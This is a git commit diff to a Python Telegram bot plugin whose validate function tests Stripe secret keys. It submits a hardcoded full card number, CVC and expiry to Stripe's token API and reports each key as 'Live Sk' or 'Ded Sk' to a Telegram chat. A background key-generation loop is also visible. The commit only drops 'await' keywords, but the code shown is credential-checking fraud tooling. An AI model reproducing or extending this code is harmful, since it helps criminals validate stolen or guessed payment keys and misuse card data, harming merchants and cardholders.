9bf9f305fb44445c0f63a58b3bb58cc7584d3c23
Mr Vishal <67860986+Mrvishal2k2@users.noreply.github.com>
2021-10-25 17:22:07 +0530

    Update utils.py

--- plugins/utils.py
+++ plugins/utils.py
@@ -18,11 +18,11 @@ def validate(skkey):
     pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
     if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
       log.error(f"DEAD > {skkey}")
-      return await Client.send_message(chat_id=chatid,text=f"Ded Sk 💖\n{skkey}")
+      return Client.send_message(chat_id=chatid,text=f"Ded Sk 💖\n{skkey}")
 
     else:
       log.info(f"LIVE > {skkey}")
-      return await Client.send_message(chat_id=chatid,text=f"Live Sk 💖\n{skkey}")
+      return Client.send_message(chat_id=chatid,text=f"Live Sk 💖\n{skkey}")
 
 async def backgen():
     while True:
